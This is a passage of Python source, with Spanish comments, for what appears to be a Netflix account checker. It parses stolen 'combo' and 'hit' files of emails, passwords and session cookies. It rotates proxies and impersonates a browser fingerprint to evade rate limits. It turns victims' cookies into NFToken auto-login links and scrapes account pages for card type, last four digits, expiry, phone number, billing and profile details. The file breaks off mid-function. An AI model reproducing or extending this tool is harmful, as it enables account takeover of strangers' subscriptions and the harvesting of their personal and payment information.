import json
import re
import logging
import time
import threading as _threading
import concurrent.futures as _cf
from typing import Optional
from datetime import datetime

# ---------------------------------------------------------------------------
# Proxy manager — pool rotativo de proxies
# ---------------------------------------------------------------------------
try:
    from proxy_manager import proxy_manager as _proxy_manager
    _PROXY_ENABLED = True
except Exception:
    _proxy_manager = None  # type: ignore
    _PROXY_ENABLED = False

try:
    from curl_cffi import requests as _curl_requests
    _CURL_AVAILABLE = True
except ImportError:
    import requests as _curl_requests
    _CURL_AVAILABLE = False

import requests
import requests.adapters

logger = logging.getLogger(__name__)
logger.setLevel(logging.WARNING)


# ---------------------------------------------------------------------------
# Decodificadores y limpiadores de cadenas
# ---------------------------------------------------------------------------

def _decode_js_hex(s: str) -> str:
    """Convierte secuencias de escape hexadecimales de JS \\xNN a caracteres reales."""
    return re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)


def _decode_unicode_escapes(s: str) -> str:
    """Decodifica entidades HTML y secuencias unicode a caracteres y emojis reales."""
    if not s:
        return s
    # 1. Decodifica entidades HTML como &#x1F6A9; -> 🚩 o &amp; -> &
    try:
        s = _html.unescape(s)
    except Exception:
        pass

    # 2. Decodifica secuencias de escape unicode \uD83D\uDEA9 -> 🚩
    if '\\u' in s or '\\U' in s:
        try:
            s = s.encode('raw_unicode_escape').decode('unicode_escape')
        except Exception:
            try:
                s = s.encode('ascii').decode('unicode_escape')
            except Exception:
                pass
    return s


def _clean_price(s: str) -> str:
    """Decodifica símbolos monetarios y limpia cadenas de precios."""
    if not s:
        return s
    s = _decode_unicode_escapes(s)
    s = s.replace('\u00a0', ' ').replace('\xa0', ' ').strip()
    return s


# ---------------------------------------------------------------------------
# Procesamiento de respuestas y datos de Netflix
# ---------------------------------------------------------------------------

def _extract_reactcontext(html: str) -> dict:
    anchors = [
        "netflix.reactContext = {",
        "netflix.reactContext={",
    ]
    for anchor in anchors:
        pos = html.find(anchor)
        if pos == -1:
            continue
        brace_pos = html.index("{", pos + len(anchor) - 1)
        raw_chunk = html[brace_pos: brace_pos + 3_000_000]
        raw_fixed = _decode_js_hex(raw_chunk)

        depth = 0
        in_str = False
        esc = False
        i = 0
        while i < len(raw_fixed):
            c = raw_fixed[i]
            if esc:
                esc = False
            elif c == "\\" and in_str:
                esc = True
            elif c == '"':
                in_str = not in_str
            elif not in_str:
                if c == "{":
                    depth += 1
                elif c == "}":
                    depth -= 1
                    if depth == 0:
                        try:
                            return json.loads(raw_fixed[:i + 1])
                        except json.JSONDecodeError:
                            pass
                        break
            i += 1
    return {}


def _parse_date(val) -> str:
    if not val:
        return ""
    s = str(val).strip().rstrip("Z")
    s = _decode_unicode_escapes(s)
    s = s.replace("\\x20", " ").replace("&nbsp;", " ").strip()

    if re.search(r'[A-Za-z]', s) and re.search(r'\d', s):
        m = re.match(r'^(\d{4})-(\d{2})-(\d{2})', s)
        if m:
            try:
                return datetime(int(m.group(1)), int(m.group(2)), int(m.group(3))).strftime("%B %d, %Y")
            except Exception:
                pass
        return s

    if re.match(r'^\d+$', s):
        ts = int(s)
        try:
            if ts > 9_999_999_999:
                return datetime.utcfromtimestamp(ts / 1000).strftime("%B %d, %Y")
            return datetime.utcfromtimestamp(ts).strftime("%B %d, %Y")
        except Exception:
            pass

    m = re.match(r'^(\d{4})-(\d{2})-(\d{2})', s)
    if m:
        try:
            return datetime(int(m.group(1)), int(m.group(2)), int(m.group(3))).strftime("%B %d, %Y")
        except Exception:
            pass
    return s


BROWSER_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "es-US,es;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
}

_LOGIN_PAGE_MARKERS = (
    'name="userLoginId"',
    '"signupContext":"login"',
    '"pageType":"login"',
    '"page-type" content="login"',
    'id="login-button"',
    '"authURL":"',
    '"context":"login"',
    'class="login-content"',
)

_RATE_LIMIT_MARKERS = (
    '"429"',
    'Too Many Requests',
    'rate limit',
    'Your request has been blocked',
    'Access Denied',
    'cf-error-details',
    'Cloudflare',
)


def _is_login_page(url: str, html: str) -> bool:
    if "login" in url or "signin" in url.lower():
        return True
    if html and any(m in html[:4000] for m in _LOGIN_PAGE_MARKERS):
        return True
    return False


def _is_rate_limited(status_code: int, html: str) -> bool:
    if status_code == 429:
        return True
    if status_code in (403, 503) and html and any(m in html[:2000] for m in _RATE_LIMIT_MARKERS):
        return True
    return False


QUALITY_MAP = {
    "UHD": "4K+HDR",
    "ULTRA_HD": "4K+HDR",
    "HD": "1080p",
    "HIGH": "1080p",
    "MEDIUM": "720p",
    "SD": "480p",
    "LOW": "480p",
}

PLAN_MAP = {
    "standard with ads": {"name": "Standard with Ads", "quality": "1080p", "streams": 2},
    "standard": {"name": "Standard", "quality": "1080p", "streams": 2},
    "basic": {"name": "Basic", "quality": "480p", "streams": 1},
    "mobile": {"name": "Mobile", "quality": "480p", "streams": 1},
    "premium": {"name": "Premium", "quality": "4K+HDR", "streams": 4},
}

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_PARAMS = {
    "appVersion": "15.48.1",
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-A2111-D4F5B3A6E7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "pathFormat": "graph",
    "responseFormat": "json",
    "path": '["account","token","default"]',
    "config": json.dumps({"device_type": "NFAPPL-02-", "idiom": "phone", "iosVersion": "15.8.5", "appVersion": "15.48.1"}),
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.9",
    "x-netflix.client.type": "argo",
    "x-netflix.request.routing": json.dumps({"path": "/nq/mobile/nqios/~15.48.0/user", "control_tag": "iosui_argo"}),
    "x-netflix.context": "{}",
    "x-netflix.profiles": "{}",
    "x-netflix.app-version": "15.48.1",
    "x-netflix.idiom": "phone",
    "x-netflix.os.version": "15.8.5",
    "x-netflix.device.model": "iPhone8,1",
}


# ---------------------------------------------------------------------------
# Parsers de combos y cookies
# ---------------------------------------------------------------------------

def is_combo_line(text: str) -> bool:
    for line in text.splitlines():
        line = line.strip()
        if line and "|" in line and "NetflixId" in line and "=" in line:
            return True
    return False


def parse_combo_line(line: str) -> dict | None:
    line = line.strip()
    if not line or "|" not in line or "NetflixId" not in line:
        return None
    parts = [p.strip() for p in line.split("|")]
    result: dict = {"cookies": {}}
    first = parts[0]
    if ":" in first:
        email, _, password = first.partition(":")
        result["email"] = email.strip()
        if password.strip():
            result["password"] = password.strip()
    elif "@" in first:
        result["email"] = first.strip()
    for part in parts[1:]:
        if "=" not in part:
            continue
        key, _, value = part.partition("=")
        key = key.strip()
        value = value.strip()
        if key == "NetflixId":
            result["cookies"]["NetflixId"] = value
        elif key == "SecureNetflixId":
            result["cookies"]["SecureNetflixId"] = value
        elif key == "nfvdid":
            result["cookies"]["nfvdid"] = value
        elif key == "Country":
            result["country"] = value
        elif key == "memberPlan":
            pname = value.strip()
            _norm = pname.lower()
            if _norm in ("base", "basico", "básico"):
                pname = "Basic"
            elif _norm in ("cao cấp", "standard with ads"):
                pname = "Standard with Ads"
            result["plan_name"] = pname
            for map_key, info in PLAN_MAP.items():
                if map_key in _norm or _norm in map_key:
                    result.setdefault("quality", info["quality"])
                    result.setdefault("max_streams", info["streams"])
                    break
        elif key == "memberSince":
            result["member_since"] = value
        elif key == "videoQuality":
            result["quality"] = value
        elif key == "maxStreams":
            try:
                result["max_streams"] = int(value)
            except ValueError:
                result["max_streams"] = value
        elif key == "Price":
            result["price"] = value
        elif key in ("PaymentMethod", "paymentType"):
            existing = result.get("payment", "")
            result["payment"] = f"{existing} / {value}".lstrip(" /") if existing else value
        elif key == "phonenumber":
            result["phone"] = value
    if not result["cookies"].get("NetflixId"):
        return None
    return result


def parse_netscape_cookies(text: str) -> dict:
    cookies = {}
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            name = parts[5].strip()
            value = parts[6].strip()
            if name:
                cookies[name] = value
    return cookies


def parse_json_cookies(text: str) -> dict:
    cookies = {}
    try:
        data = json.loads(text)
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict) and "name" in item and "value" in item:
                    cookies[item["name"]] = item["value"]
        elif isinstance(data, dict):
            cookies = data
    except json.JSONDecodeError:
        pass
    return cookies


def parse_header_cookies(text: str) -> dict:
    cookies = {}
    for part in text.split(";"):
        part = part.strip()
        if "=" in part:
            name, _, value = part.partition("=")
            name = name.strip()
            value = value.strip()
            if name and len(name) < 80 and "\n" not in name:
                cookies[name] = value
    return cookies


_HIT_COOKIE_LINE_RE = re.compile(
    r'^[•\-*]?\s*[Cc]ookies?\s*[:\|]+\s*(.+)',
)

_SESSION_KEYS = {"NetflixId", "SecureNetflixId", "nfvdid", "gsid"}


def parse_hit_file_cookies(text: str) -> dict:
    for line in text.splitlines():
        m = _HIT_COOKIE_LINE_RE.match(line.strip())
        if not m:
            continue
        cookie_string = m.group(1).strip()
        if len(cookie_string) < 10:
            continue
        result = parse_header_cookies(cookie_string)
        if result and any(k in result for k in _SESSION_KEYS):
            return result
    return {}


def auto_parse_cookies(text: str) -> dict:
    text = text.strip()
    if not text:
        return {}
    if text.startswith("[") or text.startswith("{"):
        result = parse_json_cookies(text)
        if result:
            return result
    result = parse_netscape_cookies(text)
    if result:
        return result
    for line in text.splitlines():
        parsed = parse_combo_line(line)
        if parsed and parsed.get("cookies"):
            return parsed["cookies"]
    result = parse_hit_file_cookies(text)
    if result:
        return result
    if "\n" in text:
        nl_cookies: dict[str, str] = {}
        for line in text.splitlines():
            line = line.strip()
            if not line or "=" not in line or "\t" in line:
                continue
            name, _, value = line.partition("=")
            name = name.strip()
            if name and len(name) < 80:
                nl_cookies[name] = value.strip()
        if nl_cookies and any(k in nl_cookies for k in _SESSION_KEYS):
            return nl_cookies
    return parse_header_cookies(text)


_NETFLIX_ID_RE = re.compile(
    r'(?<![A-Za-z])NetflixId[\t "\'=:\s]*([^\t "\'&;\n\r|,]{10,})',
)


def universal_extract_accounts(text: str) -> list[str]:
    lines = text.splitlines()
    nf_hits: list[tuple[int, str]] = []
    seen: set[str] = set()
    for i, line in enumerate(lines):
        m = _NETFLIX_ID_RE.search(line)
        if not m:
            continue
        val = m.group(1).strip().rstrip('",;|\')')
        if val and val not in seen:
            seen.add(val)
            nf_hits.append((i, val))
    if len(nf_hits) <= 1:
        return []
    blocks: list[str] = []
    for idx, (line_no, _) in enumerate(nf_hits):
        start = 0 if idx == 0 else (nf_hits[idx - 1][0] + line_no) // 2 + 1
        end = len(lines) if idx == len(nf_hits) - 1 else (line_no + nf_hits[idx + 1][0]) // 2 + 1
        block = "\n".join(lines[start:end]).strip()
        if block:
            blocks.append(block)
    return blocks


def extract_file_metadata(text: str) -> dict:
    meta = {}
    email_match = re.search(r'DETAILS:\s*(.+)', text, re.IGNORECASE)
    if email_match:
        email = email_match.group(1).strip().replace("\\x40", "@").replace("%40", "@")
        meta["email"] = email
    bracket = re.search(
        r'\[([^\]]+)\]-\[([^\]]+)\]-\[([^\]]+)\]-\[([^\]]+)\]-\[([^\]]+)\]-\[([^\]]+)\]', text
    )
    if bracket:
        meta["country"] = bracket.group(2).strip()
        meta["plan_name"] = bracket.group(3).strip()
        meta["quality"] = bracket.group(4).strip()
        meta["next_billing"] = bracket.group(5).strip()
        meta["payment"] = bracket.group(6).strip()
        plan_lower = meta["plan_name"].lower()
        for key, info in PLAN_MAP.items():
            if key in plan_lower:
                meta["max_streams"] = info["streams"]
                break
    return meta


# ---------------------------------------------------------------------------
# Generador NFToken (con reporte detallado de error y soporte a proxies)
# ---------------------------------------------------------------------------

def generate_nftoken(cookies: dict) -> dict:
    netflix_id = (
        cookies.get("NetflixId")
        or cookies.get("netflixId")
        or cookies.get("netflix_id")
    )
    if not netflix_id:
        return {"success": False, "error": "Cookie NetflixId no encontrada"}

    cookie_parts = [f"NetflixId={netflix_id}"]
    sec_id = (
        cookies.get("SecureNetflixId")
        or cookies.get("secureNetflixId")
        or cookies.get("secure_netflix_id")
    )
    if sec_id:
        cookie_parts.append(f"SecureNetflixId={sec_id}")
    nfvd = cookies.get("nfvdid") or cookies.get("nfvdId")
    if nfvd:
        cookie_parts.append(f"nfvdid={nfvd}")
    cookie_header = "; ".join(cookie_parts)

    headers = {**NFTOKEN_HEADERS, "Cookie": cookie_header}

    attempts = [None]
    if _PROXY_ENABLED and _proxy_manager and _proxy_manager.enabled:
        p = _proxy_manager.get_proxies_dict()
        if p:
            attempts.append(p)

    last_error_msg = "Error desconocido"

    for proxy_dict in attempts:
        try:
            resp = requests.get(
                NFTOKEN_API_URL,
                params=NFTOKEN_PARAMS,
                headers=headers,
                proxies=proxy_dict,
                timeout=9,
            )

            if resp.status_code != 200:
                err_text = ""
                try:
                    err_json = resp.json()
                    err_text = err_json.get("message") or err_json.get("error") or ""
                except Exception:
                    if resp.text:
                        err_text = resp.text.replace("\n", " ")[:60].strip()
                last_error_msg = f"HTTP {resp.status_code} ({err_text})" if err_text else f"HTTP {resp.status_code}"
                if resp.status_code in (500, 502, 503, 403) and proxy_dict is None and len(attempts) > 1:
                    continue
                return {"success": False, "error": last_error_msg}

            try:
                data = resp.json()
            except Exception:
                raw_snippet = resp.text.replace("\n", " ")[:70] if resp.text else "Respuesta vacía"
                return {"success": False, "error": f"Respuesta no JSON: {raw_snippet}"}

            token = None
            expires = None

            def_val = data.get("value", {}).get("account", {}).get("token", {}).get("default")
            if isinstance(def_val, dict):
                token = def_val.get("token") or def_val.get("value")
                expires = def_val.get("expires")
            elif isinstance(def_val, str) and len(def_val) > 10:
                token = def_val

            if not token:
                jg_val = data.get("jsonGraph", {}).get("account", {}).get("token", {}).get("default")
                if isinstance(jg_val, dict):
                    token = jg_val.get("value") or jg_val.get("token")
                    expires = jg_val.get("expires")
                elif isinstance(jg_val, str) and len(jg_val) > 10:
                    token = jg_val

            if not token:
                acc_val = data.get("account", {}).get("token", {}).get("default")
                if isinstance(acc_val, dict):
                    token = acc_val.get("token") or acc_val.get("value")
                    expires = acc_val.get("expires")
                elif isinstance(acc_val, str) and len(acc_val) > 10:
                    token = acc_val

            if token and isinstance(token, str):
                return {
                    "success": True,
                    "pc_url": f"https://netflix.com/?nftoken={token}",
                    "mobile_url": f"https://netflix.com/unsupported?nftoken={token}",
                    "tv_url": f"https://netflix.com/tv9?nftoken={token}",
                    "expires": str(expires) if expires else None,
                    "error": None,
                }

            def _find_falcor_error(obj, depth=0):
                if depth > 7:
                    return None
                if isinstance(obj, dict):
                    if obj.get("$type") == "error":
                        val = obj.get("value")
                        if isinstance(val, dict):
                            return val.get("message") or val.get("errorType") or str(val)
                        return str(val) if val else "Error de autenticación Falcor"
                    for v in obj.values():
                        res = _find_falcor_error(v, depth + 1)
                        if res:
                            return res
                elif isinstance(obj, list):
                    for item in obj:
                        res = _find_falcor_error(item, depth + 1)
                        if res:
                            return res
                return None

            falcor_err = _find_falcor_error(data)
            if falcor_err:
                return {"success": False, "error": f"Netflix rechazó token: {falcor_err}"}

            if "message" in data:
                return {"success": False, "error": f"Mensaje Netflix: {data['message']}"}

            if "error" in data:
                return {"success": False, "error": f"Error Netflix: {data['error']}"}

            if def_val is None:
                return {"success": False, "error": "Token nulo (sesión no válida para emisión o bloqueo de hogar)"}

            snippet = json.dumps(data, ensure_ascii=False)[:80]
            return {"success": False, "error": f"Sin token. Respuesta API: {snippet}"}

        except requests.exceptions.Timeout:
            last_error_msg = "Tiempo de espera agotado (timeout API)"
        except Exception as exc:
            last_error_msg = f"Error en petición: {str(exc)[:60]}"

    return {"success": False, "error": last_error_msg}


# ---------------------------------------------------------------------------
# Extractores de campos
# ---------------------------------------------------------------------------

def _brace_extract(html: str, start_pos: int) -> dict | list | None:
    raw = _decode_js_hex(html[start_pos:start_pos + 100000])
    opening = raw[0] if raw else ''
    closing = '}' if opening == '{' else ']'
    depth = 0
    in_str = False
    esc = False
    for i, c in enumerate(raw):
        if esc:
            esc = False
        elif c == '\\' and in_str:
            esc = True
        elif c == '"':
            in_str = not in_str
        elif not in_str:
            if c in '{[':
                depth += 1
            elif c in ']}':
                depth -= 1
                if depth == 0:
                    try:
                        return json.loads(raw[:i + 1])
                    except Exception:
                        return None
    return None


def _extract_userinfo(html: str) -> dict:
    m = re.search(r'"userInfo"\s*:\s*\{[^{]*"data"\s*:\s*(\{)', html)
    if not m:
        return {}
    result = _brace_extract(html, m.start(1))
    return result if isinstance(result, dict) else {}


def _falcon_val(field: dict):
    if isinstance(field, dict):
        return field.get("value")
    return field


def _extract_member_plan(html: str) -> dict:
    result = {}
    m = re.search(
        r'"currentPlan"\s*:\s*\{[^{]*"fieldGroup"\s*:\s*"MemberPlan"\s*,\s*"fields"\s*:\s*(\{)',
        html
    )
    if not m:
        m = re.search(r'"fieldGroup"\s*:\s*"MemberPlan"\s*,\s*"fields"\s*:\s*(\{)', html)
    if not m:
        return result

    fields = _brace_extract(html, m.start(1))
    if not isinstance(fields, dict):
        return result

    fv = _falcon_val

    plan_name = fv(fields.get("localizedPlanName")) or fv(fields.get("planName"))
    raw_quality = fv(fields.get("videoQuality"))
    max_streams = fv(fields.get("maxStreams"))
    has_ads = fv(fields.get("hasAds"))
    plan_id = fv(fields.get("planId"))
    next_billing_raw = fv(fields.get("nextBillingDate"))
    price_raw = fv(fields.get("planPrice")) or fv(fields.get("formattedPlanPrice"))
    is_on_hold = fv(fields.get("isOnHold"))
    num_extra = fv(fields.get("numExtraMembers"))
    bobo = fv(fields.get("bobo"))

    if plan_name:
        result["plan_name"] = str(plan_name)
    if raw_quality:
        q = str(raw_quality).upper()
        result["quality"] = QUALITY_MAP.get(q, str(raw_quality))
    if max_streams is not None:
        result["max_streams"] = str(max_streams)
    if has_ads is not None:
        result["has_ads"] = bool(has_ads)
    if plan_id:
        result["plan_id"] = str(plan_id)
    if next_billing_raw:
        result["next_billing"] = _parse_date(str(next_billing_raw))
    if price_raw:
        result["price"] = _clean_price(str(price_raw))
    if is_on_hold is not None:
        result["is_on_hold"] = bool(is_on_hold)
    if num_extra is not None:
        result["num_extra_members"] = int(num_extra) if str(num_extra).isdigit() else 0
    if bobo is not None:
        result["bobo"] = bool(bobo)

    return result


def _extract_billing_date_from_html(html: str) -> str:
    html_decoded = _decode_js_hex(html)
    patterns = [
        r'data-uia="nextBillingDate-item"[^>]*>([^<]+)<',
        r'data-uia="account-billing-date"[^>]*>([^<]+)<',
        r'"localizedNextBillingDate"\s*:\s*"([^"]+)"',
        r'"nextBillingDateFormatted"\s*:\s*"([^"]+)"',
        r'"nextBillingDate"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
        r'"nextBillingDate"\s*:\s*\{\s*"value"\s*:\s*"([^"]+)"',
        r'"renewalDate"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
        r'"renewalDate"\s*:\s*"([^"]+)"',
        r'"nextBillingDate"\s*:\s*(\d{10,13})',
    ]
    for pat in patterns:
        for m in re.finditer(pat, html_decoded, re.IGNORECASE):
            candidate = m.group(1).strip()
            if '{' in candidate or '}' in candidate or candidate.lower() in ('null', 'unknown', 'undefined'):
                continue
            result = _parse_date(candidate)
            if result:
                return result
    return ""


def _extract_price_from_html(html: str) -> str:
    html_decoded = _decode_js_hex(html)
    patterns = [
        r'data-uia="plan-price"[^>]*>([^<]+)<',
        r'"formattedPlanPrice"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
        r'"planPrice"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
        r'"planPrice"\s*:\s*\{"fieldType"\s*:\s*"Numeric"\s*,\s*"value"\s*:\s*([0-9.]+)',
        r'"planPrice"\s*:\s*"([^"]+)"',
        r'"billingAmount"\s*:\s*"?([0-9.,]+[^",]*)"?',
    ]
    for pat in patterns:
        m = re.search(pat, html_decoded, re.IGNORECASE)
        if m:
            raw = m.group(1).strip()
            if raw and raw.lower() not in ('null', 'undefined', 'unknown'):
                return _clean_price(raw)
    return ""


def _extract_payment_info(html: str) -> dict:
    result = {}
    html_decoded = _decode_js_hex(html)

    m = re.search(r'"paymentMethods"\s*:\s*\{"fieldType"\s*:\s*"Custom"\s*,\s*"value"\s*:\s*(\[)', html_decoded)
    if not m:
        m = re.search(r'"paymentMethods"\s*:\s*\{[^[]*"value"\s*:\s*(\[)', html_decoded)
    if not m:
        return result

    arr = _brace_extract(html_decoded, m.start(1))
    if not isinstance(arr, list) or not arr:
        return result

    first = arr[0]
    if isinstance(first, dict) and "value" in first:
        pm = first["value"]
        if not isinstance(pm, dict):
            return result

        def fv(key):
            f = pm.get(key, {})
            if isinstance(f, dict):
                return f.get("value")
            return f

        partner = fv("partnerDisplayName")
        is_third = fv("thirdPartyBillingPartner")
        card_type = fv("creditCardType") or fv("paymentType")
        last_four = fv("cardLastFour") or fv("lastFourDigits") or fv("lastFour")
        exp_mo = fv("cardExpirationMonth")
        exp_yr = fv("cardExpirationYear")
        alt_method = fv("paymentMethod")
        display_text = fv("displayText")

        result["is_third_party"] = bool(is_third)
        result["partner_name"] = str(partner) if partner else ""

        parts = []
        if partner and is_third:
            parts.append(str(partner))
            result["card_type"] = str(partner)
        elif card_type:
            ct = str(card_type)
            result["card_type"] = ct.upper() if len(ct) <= 10 else ct.title()
            parts.append(result["card_type"])
            if last_four:
                result["card_last4"] = str(last_four)
                parts.append(f"···· {last_four}")
            card_expired = False
            if exp_mo and exp_yr:
                try:
                    now = datetime.now()
                    ey = int(str(exp_yr))
                    em = int(str(exp_mo))
                    card_expired = ey < now.year or (ey == now.year and em < now.month)
                except Exception:
                    pass
                exp_str = f"{str(exp_mo).zfill(2)}/{str(exp_yr)[-2:]}"
                result["card_expiry"] = exp_str
                result["card_expired"] = card_expired
                if card_expired:
                    parts.append(f"(⚠️ EXPIRED {exp_str})")
                else:
                    parts.append(f"(exp {exp_str})")
        elif alt_method:
            method_str = str(alt_method).upper()
            disp = str(display_text).strip() if display_text else ""
            if method_str in ("CC", "DC", "DEBIT", "CREDIT") and re.match(r'^\d{4}$', disp):
                result["card_type"] = method_str
                result["card_last4"] = disp
                parts.append(f"{method_str} ···· {disp}")
            elif disp:
                result["card_type"] = method_str
                parts.append(f"{method_str}: {disp}")
            else:
                result["card_type"] = method_str
                parts.append(method_str)
        elif is_third:
            parts.append("Third-party billing")

        result["payment"] = " ".join(parts) if parts else ""

    return result


def _extract_profiles_list(html_str: str) -> tuple[list[str], int]:
    """Extrae perfiles decodificando emojis, entidades HTML (&apos;, &#x1F6A9;) y texto JSON."""
    if not html_str:
        return [], 0

    import html as _html_lib

    html_decoded = _decode_js_hex(html_str)
    names = []
    seen = set()

    def _add_name(candidate: str):
        if not candidate:
            return
        # 1. Convierte entidades HTML como &apos; -> ' y &#x1F6A9; -> 🚩
        c = _html_lib.unescape(str(candidate)).strip()
        # 2. Decodifica secuencias unicode \uXXXX si aún quedan
        if '\\u' in c or '\\U' in c:
            try:
                c = c.encode('raw_unicode_escape').decode('unicode_escape')
            except Exception:
                pass
        c = c.strip()
        if c and c.lower() not in ("null", "undefined", "true", "false", ""):
            if c not in seen:
                seen.add(c)
                names.append(c)

    # 1. netflix.reactContext
    ctx = _extract_reactcontext(html_str)
    if ctx:
        models = ctx.get("models", {})
        prof_data = (
            models.get("profilesList", {}).get("data")
            or models.get("profiles", {}).get("data")
            or models.get("allProfiles", {}).get("data")
        )
        if isinstance(prof_data, list):
            for p in prof_data:
                if isinstance(p, dict):
                    pname = str(p.get("profileName") or p.get("name") or "")
                    _add_name(pname)

    # 2. JSON regex
    for m in re.finditer(r'"profileName"\s*:\s*"([^"]{1,80})"', html_decoded):
        _add_name(m.group(1))

    # 3. HTML tags visibles (ManageProfiles / browse)
    html_patterns = [
        r'class="profile-name"[^>]*>([^<]+)<',
        r'data-uia="profile-name"[^>]*>([^<]+)<',
        r'<span class="profile-name">([^<]+)</span>',
        r'class="profile-link"[^>]*title="([^"]+)"',
    ]
    for pat in html_patterns:
        for m in re.finditer(pat, html_decoded):
            _add_name(m.group(1))

    total_count = len(names)
    m = re.search(r'"profiles"\s*:\s*(\[)', html_decoded)
    if m:
        arr = _brace_extract(html_decoded, m.start(1))
        if isinstance(arr, list) and len(arr) > total_count:
            total_count = len(arr)

    return names, total_count


def _deep_search_ctx(obj, depth: int = 0) -> list[tuple[str, str]]:
    if depth > 12:
        return []

    hits: list[tuple[str, str]] = []

    BAD_ENUM_VALUES = {
        "SUSPENDED", "TERMINATED", "BLOCKED", "DEACTIVATED", "CLOSED",
        "PAYMENT_DUE", "PAYMENT_HOLD", "ON_HOLD", "PAYMENT_DECLINED",
        "BILLING_PROBLEM", "PAYMENT_FAILED", "ACCOUNT_SUSPENDED",
        "GRACE_PERIOD", "SUSPENDED_BILLING", "UPDATE_PAYMENT",
        "REACTIVATE",
    }

    PAYMENT_ACTIONS = {
        "UPDATE_PAYMENT_METHOD", "UPDATE_PAYMENT_INFO", "TRY_PAYMENT_AGAIN",
        "RETRY_PAYMENT", "REACTIVATE_ACCOUNT", "FIX_PAYMENT",
        "UPDATE_PAYMENT", "PAYMENT_UPDATE", "MANAGE_PAYMENT_METHOD",
    }

    ALERT_PRESENCE_KEYS = {
        "gracePeriodEndDate", "gracePeriodEnd", "gracePeriodMessage",
        "onHoldMessageText", "onHoldMessage",
        "suspendedMessageText", "suspendedMessage",
        "paymentAlertMessage", "billingAlertMessage",
        "paymentDeclinedMessage", "paymentRetryMessage",
        "paymentUpdateMessage",
    }

    _BAD_BOOL_RE = re.compile(
        r'^(is|has|show)?(Suspended|Terminated|Locked|Blocked|'
        r'PaymentDue|PaymentDeclined|BillingProblem|PaymentFailed|'
        r'PaymentOverdue|PaymentIssue|OnHold|InGracePeriod|GracePeriod|'
        r'PaymentUpdateRequired)',
        re.IGNORECASE,
    )

    if isinstance(obj, dict):
        for key, val in obj.items():
            if key == "isInGoodStanding" and val is False:
                hits.append(("not_good_standing", "Account not in good standing"))
            elif key == "isOnHold" and val is True:
                hits.append(("on_hold_flag", "Account on hold"))
            elif key in ALERT_PRESENCE_KEYS:
                v = val.get("value", val) if isinstance(val, dict) else val
                if v and str(v) not in ("", "null", "false", "0"):
                    hits.append(("alert_key", f"Alert: {key}"))
            elif val is True and _BAD_BOOL_RE.match(key):
                hits.append(("bool_flag", f"Flag: {key}"))
            elif isinstance(val, str):
                vu = val.upper()
                kl = key.lower()
                if vu in BAD_ENUM_VALUES and any(
                    x in kl for x in ("status", "type", "state", "alert", "mode", "reason")
                ):
                    hits.append(("bad_enum", f"Status: {val}"))
                elif vu in PAYMENT_ACTIONS:
                    hits.append(("payment_action", "Payment action required"))

            if isinstance(val, (dict, list)):
                hits.extend(_deep_search_ctx(val, depth + 1))

    elif isinstance(obj, list):
        for item in obj[:40]:
            if isinstance(item, (dict, list)):
                hits.extend(_deep_search_ctx(item, depth + 1))

    return hits


def _detect_account_issues(html: str) -> list[str]:
    seen: set[str] = set()
    issues: list[str] = []

    def _add(label: str) -> None:
        if label not in seen:
            seen.add(label)
            issues.append(label)

    ctx = _extract_reactcontext(html)
    if ctx:
        for _, label in _deep_search_ctx(ctx):
            _add(label)

    html_decoded = _decode_js_hex(html)

    ms_m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html_decoded)
    if ms_m:
        ms = ms_m.group(1).upper()
        if ms in ("SUSPENDED", "TERMINATED", "BLOCKED", "DEACTIVATED", "CLOSED",
                  "PAYMENT_DUE", "PAYMENT_HOLD", "ON_HOLD"):
            _add(f"Account status: {ms}")

    if re.search(r'"isInGoodStanding"\s*:\s*false', html_decoded, re.IGNORECASE):
        _add("Account not in good standing")

    for flag, label in {
        "isSuspended":        "Account suspended",
        "isTerminated":       "Account terminated",
        "isOnHold":           "Account on hold",
        "paymentDeclined":    "Payment declined",
        "isPaymentDue":       "Payment due",
        "hasBillingProblem":  "Billing problem",
        "isInGracePeriod":    "Account in grace period",
    }.items():
        if re.search(rf'"{flag}"\s*:\s*true', html_decoded, re.IGNORECASE):
            _add(label)

    return issues


def _extract_phone(html: str) -> str:
    html_decoded = _decode_js_hex(html)
    for m in re.finditer(r'"phoneNumber"\s*:\s*"([^"]{5,25})"', html_decoded):
        ph = m.group(1).strip()
        if ph and ph != 'null':
            return ph
    return ""


def _extract_email_verified(html: str) -> bool | None:
    html_decoded = _decode_js_hex(html)
    m = re.search(r'"isEmailVerified"\s*:\s*(true|false)', html_decoded, re.IGNORECASE)
    if m:
        return m.group(1).lower() == 'true'
    return None


# ---------------------------------------------------------------------------
# Verificador de cookies principal
# ---------------------------------------------------------------------------

_tl_session = _threading.local()


def _get_pooled_session() -> tuple:
    if not getattr(_tl_session, "session", None):
        if _CURL_AVAILABLE:
            s = _curl_requests.Session(impersonate="chrome124")
